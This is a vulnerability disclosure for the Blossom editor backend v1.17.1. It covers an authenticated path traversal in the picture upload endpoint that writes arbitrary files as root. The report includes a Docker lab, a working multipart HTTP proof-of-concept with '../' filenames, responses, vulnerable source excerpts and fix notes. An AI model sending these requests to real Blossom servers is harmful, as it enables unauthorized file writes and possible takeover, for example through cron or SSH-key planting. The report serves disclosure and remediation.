### Vulnerability details

**Official website / Product:** https://www.wangyunf.com/blossom-doc/index / https://github.com/blossom-editor/blossom

**Repository:** blossom-editor/blossom (stars at selection: 3800)

**Vulnerability type:** file_upload (path traversal → arbitrary file write as process user)

**Vulnerability versions:** v1.17.1 (release jar `backend-blossom.jar`, Implementation-Version `1.17.1-SNAPSHOT`); present in current default-branch source at audit time

**Vulnerability URL / Parameter:**
- `POST /picture/file/upload` — multipart fields `filename` and/or file part `Content-Disposition` filename (`MultipartFile.getOriginalFilename()`)
- Related: `POST /folder/add` / `POST /folder/upd` field `storePath` (concatenated into the same path without stripping `..`)

**Complex:** yes

### Verification procedure

1. Build and start the Docker lab (equivalent tree: `labs/blossom-r66-a2/`). Image `blossom-r66-a2:1.17.1` (`eclipse-temurin:8-jre` + official [v1.17.1 `backend-blossom.jar`](https://github.com/blossom-editor/blossom/releases/download/v1.17.1/backend-blossom.jar)) + `mysql:8.0.31`; containers `blossom-r66-a2` / `blossom-r66-a2-mysql`; host port **24602** → container `9999`; BLOS: `PROJECT_IAAS_BLOS_DEFAULT-PATH=/home/bl/img/`, `PROJECT_IAAS_BLOS_DOMAIN=http://127.0.0.1:24602/pic/`; default admin `blos` / `blos` (seeded by `schema-mysql.sql` via `spring.sql.init.mode=always` on startup). Audited source tip: `939357716c04b090635439741dc4564f3e6513e1`.

```bash
mkdir -p /tmp/blossom-r66-a2-lab
cd /tmp/blossom-r66-a2-lab
cat > Dockerfile <<'EOF'
# Blossom backend v1.17.1 lab image (official release jar)
FROM eclipse-temurin:8-jre

WORKDIR /app

ARG JAR_URL=https://github.com/blossom-editor/blossom/releases/download/v1.17.1/backend-blossom.jar
ADD ${JAR_URL} /app/backend-blossom.jar

ENV JVM_OPTS="-Xmx256m -Xms256m" \
    TZ=Asia/Shanghai \
    BLOSSOM_WORK_DIR="/home/bl" \
    SPRING_CONFIG_LOCATION="optional:classpath:/;optional:classpath:/config/;optional:file:/home/bl/"

RUN mkdir -p /home/bl/img \
    && ln -sf /usr/share/zoneinfo/$TZ /etc/localtime \
    && echo $TZ > /etc/timezone

EXPOSE 9999

ENTRYPOINT ["sh", "-c", "java ${JVM_OPTS} -jar /app/backend-blossom.jar"]
EOF
cat > docker-compose.yml <<'EOF'
networks:
  blossomnet:
    driver: bridge

services:
  blossom:
    build: .
    image: blossom-r66-a2:1.17.1
    container_name: blossom-r66-a2
    environment:
      SPRING_DATASOURCE_URL: jdbc:mysql://blmysql:3306/blossom?useUnicode=true&characterEncoding=utf-8&allowPublicKeyRetrieval=true&allowMultiQueries=true&useSSL=false&serverTimezone=GMT%2B8
      SPRING_DATASOURCE_USERNAME: root
      SPRING_DATASOURCE_PASSWORD: jasmine888
      PROJECT_IAAS_BLOS_DOMAIN: http://127.0.0.1:24602/pic/
      PROJECT_IAAS_BLOS_DEFAULT-PATH: /home/bl/img/
    ports:
      - "24602:9999"
    networks:
      - blossomnet
    healthcheck:
      test: ["CMD-SHELL", "bash -c 'echo > /dev/tcp/127.0.0.1/9999'"]
      interval: 10s
      timeout: 5s
      retries: 30
      start_period: 40s
    depends_on:
      blmysql:
        condition: service_healthy

  blmysql:
    image: mysql:8.0.31
    container_name: blossom-r66-a2-mysql
    environment:
      MYSQL_DATABASE: blossom
      MYSQL_ROOT_PASSWORD: jasmine888
      LANG: C.UTF-8
      TZ: Asia/Shanghai
    networks:
      - blossomnet
    healthcheck:
      test: ["CMD", "mysqladmin", "-uroot", "-pjasmine888", "ping", "-h", "localhost"]
      interval: 10s
      timeout: 3s
      retries: 12
EOF
docker compose up -d --build
# wait until blossom-r66-a2 is healthy (~30–60s)
docker compose ps
```

2. Login for a token: `POST /login` with `{"grantType":"password","clientId":"blossom","username":"blos","password":"blos"}`; take `data.token` from the JSON and send `Authorization: Bearer <token>` on later requests.
3. **Perform one normal upload first** (creates `/home/bl/img/U1/`). If `U1` does not exist yet, a traversal filename hits Hutool `FileUtil.touch` with `IOException: No such file or directory`:
   ```bash
   curl -sS -X POST 'http://127.0.0.1:24602/picture/file/upload' \
     -H "Authorization: Bearer $TOKEN" -H 'Accept: application/json' \
     -F 'file=@-;filename=normal.txt;type=text/plain' <<<'normal' \
     -F 'repeatUpload=true'
   ```
4. Call `POST /picture/file/upload` with the Bearer token, multipart file body, and form field `filename=../../../../tmp/r66a2-evidence-write.txt` (full message below).
5. Observe JSON success (`code=20000`) returning a URL that still contains `../` segments.
6. Read the proof file inside the container:
   ```bash
   docker exec blossom-r66-a2 cat /tmp/r66a2-evidence-write.txt
   docker exec blossom-r66-a2 id   # uid=0(root)
   ```

Prerequisite login (Docker-verified):

```http
POST /login HTTP/1.1
Host: 127.0.0.1:24602
Content-Type: application/json
Content-Length: 87
Connection: close

{"grantType":"password","clientId":"blossom","username":"blos","password":"blos"}
```

Example login response (use `data.token`; value changes per login):

```http
HTTP/1.1 200 
Content-Type: application/json

{"code":"20000","msg":"成功","data":{"token":"1a09d4398dae4d4aa23523ed9ec7c4a8","expire":"1793687406504","grantType":"password","clientId":"blossom","requestRefresh":true,"multiPlaceLogin":true,"duration":21600,"userId":"1","loginTime":"2026-11-03 08:30:06","permissions":null,"metadata":{"type":"1","userId":"1","username":"blos"}}}
```

### Complete vulnerability PoC

Complete HTTP request (Docker-verified; replace `Authorization` with your own `data.token`):

```http
POST /picture/file/upload HTTP/1.1
Host: 127.0.0.1:24602
Authorization: Bearer f55cb9168ec5421f9cccc0ef063bd5ed
Accept: application/json
Content-Type: multipart/form-data; boundary=------------------------r66a2blossomPOC
Content-Length: 456
Connection: close

--------------------------r66a2blossomPOC
Content-Disposition: form-data; name="file"; filename="poc.txt"
Content-Type: text/plain

R66A2_ARBITRARY_FILE_WRITE_PROOF

--------------------------r66a2blossomPOC
Content-Disposition: form-data; name="filename"

../../../../tmp/r66a2-evidence-write.txt
--------------------------r66a2blossomPOC
Content-Disposition: form-data; name="repeatUpload"

true
--------------------------r66a2blossomPOC--
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 
Vary: origin,access-control-request-method,access-control-request-headers,accept-encoding
Content-Type: application/json
Transfer-Encoding: chunked
Date: Mon, 02 Nov 2026 17:33:33 GMT
Connection: close

7b
{"code":"20000","msg":"成功","data":"http://127.0.0.1:24602/pic/home/bl/img/U1/../../../../tmp/r66a2-evidence-write.txt"}
0

```

In-container proof:

```
=== docker exec cat /tmp/r66a2-evidence-write.txt ===
R66A2_ARBITRARY_FILE_WRITE_PROOF

=== docker exec ls -la /tmp/r66a2-evidence-write.txt /tmp/r66a2-via-original.txt /tmp/evilpath/chain.txt ===
-rw-r--r-- 1 root root 16 Nov  3 01:31 /tmp/evilpath/chain.txt
-rw-r--r-- 1 root root 33 Nov  3 01:33 /tmp/r66a2-evidence-write.txt
-rw-r--r-- 1 root root 22 Nov  3 01:31 /tmp/r66a2-via-original.txt

=== id inside container (process runs as root) ===
uid=0(root) gid=0(root) groups=0(root)
```

Verification result notes:

- Response `code` is `20000` (success) and `data` URL retains the traversal segments.
- Container file `/tmp/r66a2-evidence-write.txt` contains exactly `R66A2_ARBITRARY_FILE_WRITE_PROOF`.
- Same sink also accepts traversal solely via multipart `filename=` (without the form `filename` field), writing `/tmp/r66a2-via-original.txt`.
- Folder `storePath=/../../../../tmp/evilpath/` plus a normal upload writes `/tmp/evilpath/chain.txt`.
- App process uid=0(root), so write impact is host-filesystem-wide inside the container (config overwrite, cron drop, SSH key plant, etc.).
- On-disk path is built as `defaultPath + /U{userId} + ...`; from `/home/bl/img/U1/` you need **four** `../` segments to reach FS root then `/tmp/`.

### Vulnerability analysis

Blossom local object storage (BLOS) builds the on-disk path as:

`os.defaultPath + "/U" + userId + folder.storePath + "/" + name`

in `PictureService.insert`. The user-controlled `name` comes from the optional `filename` request parameter, or from `MultipartFile.getOriginalFilename()` when that parameter is blank. `FolderService.formatStorePath` only ensures leading/trailing `/` and collapses `//`; it does **not** reject `..`. After a single `replaceAll("//", "/")`, the path is passed to `OSManager.put` → `BLOSManager.put`, which does `FileUtil.newFile(filename)` + `FileUtil.writeFromStream` with no canonical-path confinement under `defaultPath`.

Entry controller `PictureBlosController.uploadFile` forwards multipart `filename` / `file` / `pid` / `repeatUpload` straight into `PictureService.insert` with no extra path checks.

HttpFirewall blocks `..` in the **URL path** (so `/pic/.../../...` LFI is rejected), but multipart form fields and `storePath` JSON are not subject to that check — leaving authenticated arbitrary file write.

### Trigger / sink source (full path and line numbers)

```java
# File: blossom-backend/backend/src/main/java/com/blossom/backend/server/picture/PictureBlosController.java
# Lines: 57-71
    @PostMapping("/picture/file/upload")
    public R<String> uploadFile(@RequestParam("file") MultipartFile file,
                                @RequestParam(value = "filename", required = false) String filename,
                                @RequestParam(value = "pid", required = false) Long pid,
                                @RequestParam(value = "repeatUpload", required = false) Boolean repeatUpload) {
        if (repeatUpload == null) {
            repeatUpload = false;
        }
        PictureEntity picture = baseService.insert(file, filename, pid, AuthContext.getUserId(), repeatUpload);
        // ...
        return R.ok(picture.getUrl());
    }
```

```java
# File: blossom-backend/backend/src/main/java/com/blossom/backend/server/picture/PictureService.java
# Lines: 149-201
        if (StrUtil.isBlank(filename)) {
            pic.setName(file.getOriginalFilename());
        } else {
            pic.setName(filename);
            if (StrUtil.isBlank(FileUtil.getSuffix(filename))) {
                pic.setName(filename + "." + pic.getSuffix());
            }
        }
        // ...
        final String rootPath = osManager.getDefaultPath();
        final String uid = "/U" + userId;
        final String pname = "/" + pic.getName();
        // ...
            pic.setPathName(rootPath + uid + storePath + pname);
        // ...
        pic.setPathName(pic.getPathName().replaceAll("//", "/"));
        // ...
            osManager.put(pic.getPathName(), inputStream);
```

```java
# File: blossom-backend/common/common-iaas/src/main/java/com/blossom/common/iaas/blos/BLOSManager.java
# Lines: 70-75
    public String put(String filename, InputStream inputStream) {
        File file = FileUtil.newFile(filename);
        FileUtil.writeFromStream(inputStream, file);
        return getDomain() + filename;
    }
```

```java
# File: blossom-backend/backend/src/main/java/com/blossom/backend/server/folder/FolderService.java
# Lines: 237-254
    private String formatStorePath(String storePath) {
        if (storePath == null) {
            return null;
        }
        if ("".equals(storePath)) {
            storePath = "/";
        }
        if (!StrUtil.endWith(storePath, "/")) {
            storePath = storePath + "/";
        }
        if (!StrUtil.startWith(storePath, "/")) {
            storePath = "/" + storePath;
        }
        while (storePath.contains("//")) {
            storePath = storePath.replace("//", "/");
        }
        return storePath;
    }
```

### Fix notes

1. Resolve the final path with `Path.toAbsolutePath().normalize()` (or equivalent) and require `normalized.startsWith(defaultPathNormalized)`.
2. Reject any `name` / `storePath` containing `..`, `\`, NUL, or absolute prefixes.
3. Prefer a server-generated random object name; treat client filenames as metadata only.
4. Run the container as a non-root user and keep the upload volume mounted noexec where possible.
